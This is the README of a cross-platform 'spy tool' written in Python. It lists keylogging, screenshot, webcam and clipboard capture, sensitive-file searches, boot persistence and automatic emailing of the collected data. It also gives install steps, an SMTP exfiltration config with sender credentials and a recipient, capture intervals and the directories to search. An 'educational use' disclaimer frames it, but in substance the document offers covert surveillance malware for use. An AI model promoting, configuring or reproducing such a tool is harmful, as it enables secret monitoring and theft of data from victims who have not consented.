# BlackTechX Advanced Spy Tool                                         

 [![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://python.org)                                                        
 [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-orange.svg)](https://github.com/yourusername/BlackTechX-Spy-Tool)                                                         
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)                                                   
 [![Status](https://img.shields.io/badge/Status-Development%20Ready-red.svg)](https://github.com/yourusername/BlackTechX-Spy-Tool)           

 > **⚠ WARNING: For Educational and Security Research Purposes Only**   
 >                                                                       
 > This tool is designed for educational purposes, security research,   
 > and authorized penetration testing. **Unauthorized use for malicious   
 > purposes is strictly prohibited and illegal.**                       

 ## 📸 Features                                                         

 ### Core Surveillance                                                 
 - **Keylogging**: Real-time keystroke capture with special key         
 detection                                                             
 - **Screenshots**: Automatic screen capture with multiple method       
 fallbacks                                                             
 - **Webcam Capture**: Periodic webcam image capture (if available)     
 - **Clipboard Monitoring**: Tracks copied text and sensitive data      

 ### Advanced Intelligence                                             
 - **System Information**: Comprehensive hardware and software          
 analysis                                                              
 - **Network Intelligence**: IP addresses, network interfaces,          
 connection details                                                     
 - **File Discovery**: Searches for sensitive files (.txt, .doc, .pdf,  
 etc.)                                                                 
 - **Process Monitoring**: Lists all running processes and system       
 activity                                                              

 ### Automated Reporting                                               
 - **Email Auto-Sender**: Compressed data packages sent to specified    
 email                                                                 
 - **Cross-Platform**: Works on Linux, Windows, and macOS               
 - **Persistence**: Auto-start on system boot                           
 - **UTM Virtual Machine Optimized**: Special support for Linux in UTM  

 ## 🚀 Quick Start                                                      

 ### Installation                                                                                                                      
 # Clone the repository                                                 
 git clone https://github.com/yourusername/BlackTechX-Spy-Tool.git      
 cd BlackTechX-Spy-Tool                                                   

 # Install dependencies                                                 
 pip install -r requirements.txt                                        

 # Configure email settings                                             
 python setup_config.py                                                  


                             Configuration                              

 Edit the EMAIL_CONFIG section in spy_tool.py:                           


 EMAIL_CONFIG = {                                                         
     'smtp_server': 'smtp.gmail.com',                                   
     'smtp_port': 587,                                                  
     'sender_email': 'your_email@gmail.com',                            
     'sender_password': 'your_app_password',  # Use Gmail App Password  
     'recipient_email': 'recipient_email@gmail.com',                    
     'email_interval': 300  # Send every 5 minutes                      
 }                                                                     


                                 Usage                                 


 # Start the spy tool                                                   
 python spy_tool.py                                                     

 # View help                                                           
 python spy_tool.py --help                                              


                                                                       

                            📋 Requirements                             

                          System Requirements                           

 • Python 3.8+                                                         
 • Platform: Linux, Windows, macOS                                     
 • Permissions: Administrator/root access recommended                   

                          Python Dependencies                           


 pynput>=1.7.0      # Keyboard and mouse monitoring                     
 colorama>=0.4.4    # Cross-platform colored terminal output            
 pyautogui>=0.9.53  # Screenshot and automation                         
 pyperclip>=1.8.2   # Clipboard monitoring                              
 opencv-python>=4.5.0  # Webcam capture                                 
 requests>=2.25.0   # Network operations                                


                        Linux System Dependencies                        


 # For screenshots (choose one)                                         
 sudo apt-get install gnome-screenshot                                  
 sudo apt-get install scrot                                             
 sudo apt-get install imagemagick                                       

 # For webcam capture                                                  
 sudo apt-get install python3-opencv                                    


                        ⚙ Configuration Options                         

                         Surveillance Intervals                         


 ADVANCED_CONFIG = {                                                    
     'screenshot_interval': 60,      # Screenshots every 60 seconds     
     'webcam_interval': 300,         # Webcam capture every 5 minutes   
     'clipboard_monitor': True,      # Enable clipboard monitoring      
     'system_info_interval': 600,    # System info every 10 minutes     
     'network_info': True,           # Collect network information      
     'process_list': True,           # Monitor running processes        
     'file_search': True,            # Search for sensitive files       
     'email_interval': 300           # Email reports every 5 minutes    
 }                                                                     


                        File Search Configuration                        


 # File extensions to search for                                        
 'file_extensions': ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',  
 '.csv', '.sh', '.py', '.js']                                           

 # Directories to search (platform-specific)                           
 'search_directories': ['/home', '/Users']  # Linux/macOS               
 'search_directories': ['C:\\', 'D:\\', 'E:\\']  # Windows              


                         🔧 Advanced Features                           

                       UTM Virtual Machine Support                     

 • Automatic VM detection                                               
 • Optimized for Linux running in UTM on macOS                          
 • Special handling for virtualized environments                        
 • Enhanced compatibility with virtual hardware                         

                       Cross-Platform Persistence                      

 • Windows: Registry modification for auto-start                        
 • Linux: Cron jobs and systemd services                                
 • macOS: Launch agents and cron jobs                                   
 • UTM: Virtual machine optimized persistence                           

                             Data Packaging                             

 • Compressed ZIP packages for efficient transmission                   
 • All collected data bundled together                                  
 • Timestamped file naming                                              
 • Automatic cleanup after successful transmission                     


                        ⚠ Legal and Ethical Usage                       

                          Authorized Use Cases                         

 • Security Research: Educational security analysis                     
 • Penetration Testing: Authorized security assessments                 
 • Personal Security: Monitoring your own devices                       
 • Educational Purposes: Learning about security concepts               

                          Prohibited Activities                        

 • Unauthorized Surveillance: Monitoring without consent                
 • Data Theft: Stealing sensitive information                           
 • Malicious Activities: Any harmful or destructive use                 
 • Privacy Violations: Capturing data without permission                

                            Legal Disclaimer                            


 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,        
 EXPRESS OR                                                             
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF                
 MERCHANTABILITY,                                                       
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT      
 SHALL THE                                                                
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR       
 OTHER                                                                  
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,        
 ARISING FROM,                                                          
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER          
 DEALINGS IN THE                                                        
 SOFTWARE. 
